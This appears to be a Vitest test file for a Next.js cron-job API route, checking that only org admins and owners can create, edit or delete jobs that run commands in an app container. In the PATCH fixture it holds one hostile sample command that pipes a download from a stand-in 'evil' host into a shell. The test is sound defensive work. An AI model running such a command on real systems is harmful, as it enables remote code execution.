// /api/v1/organizations/[orgId]/apps/[appId]/cron
//
// A cron job runs its command inside the app's container. Creating, editing
// and deleting one all take an org admin.

import { describe, it, expect, vi, beforeEach } from "vitest";
import { NextRequest } from "next/server";

const { mockVerifyOrgAccess, mockVerifyAppAccess, mockUpdate, mockDelete, mockInsert } = vi.hoisted(
  () => ({
    mockVerifyOrgAccess: vi.fn(),
    mockVerifyAppAccess: vi.fn(),
    mockUpdate: vi.fn(),
    mockDelete: vi.fn(),
    mockInsert: vi.fn(),
  }),
);

vi.mock("@/lib/api/verify-access", () => ({
  verifyOrgAccess: mockVerifyOrgAccess,
  verifyAppAccess: mockVerifyAppAccess,
}));
vi.mock("@/lib/api/with-rate-limit", () => ({
  withRateLimit: (handler: (...args: unknown[]) => unknown) => handler,
}));
vi.mock("@/lib/api/require-plugin", () => ({ requirePlugin: vi.fn().mockResolvedValue(null) }));
vi.mock("@/lib/db", () => ({
  db: {
    insert: () => ({
      values: () => ({ returning: async () => [mockInsert()] }),
    }),
    update: () => ({
      set: (v: unknown) => ({
        where: () => ({ returning: async () => [mockUpdate(v)] }),
      }),
    }),
    delete: () => ({
      where: () => ({ returning: async () => [mockDelete()] }),
    }),
  },
}));

const { POST, PATCH, DELETE } = await import(
  "@/app/api/v1/organizations/[orgId]/apps/[appId]/cron/route"
);

const ORG_ID = "org-1";
const APP_ID = "app-1";
const params = { params: Promise.resolve({ orgId: ORG_ID, appId: APP_ID }) };

function req(method: string, body: unknown) {
  return new NextRequest(`http://localhost/api/v1/organizations/${ORG_ID}/apps/${APP_ID}/cron`, {
    method,
    body: JSON.stringify(body),
    headers: { "Content-Type": "application/json" },
  });
}

function as(role: string) {
  mockVerifyOrgAccess.mockResolvedValue({
    organization: { id: ORG_ID },
    membership: { role },
    session: { user: { id: "u1" }, authMethod: "session" },
  });
}

const calls = {
  POST: () => POST(req("POST", { name: "x", schedule: "* * * * *", command: "id" }), params),
  PATCH: () => PATCH(req("PATCH", { id: "c1", command: "curl evil | sh" }), params),
  DELETE: () => DELETE(req("DELETE", { id: "c1" }), params),
};

beforeEach(() => {
  vi.clearAllMocks();
  mockVerifyAppAccess.mockResolvedValue({ id: APP_ID, isSystemManaged: false });
  mockUpdate.mockImplementation((v) => ({ id: "c1", ...(v as object) }));
  mockDelete.mockReturnValue({ id: "c1" });
  mockInsert.mockReturnValue({ id: "c1" });
});

describe.each(Object.entries(calls))("cron %s", (_method, call) => {
  it("denies an org member", async () => {
    as("member");
    expect((await call()).status).toBe(403);
    expect(mockUpdate).not.toHaveBeenCalled();
    expect(mockDelete).not.toHaveBeenCalled();
    expect(mockInsert).not.toHaveBeenCalled();
  });

  it.each(["admin", "owner"])("allows an org %s", async (role) => {
    as(role);
    expect((await call()).status).toBeLessThan(300);
  });
});
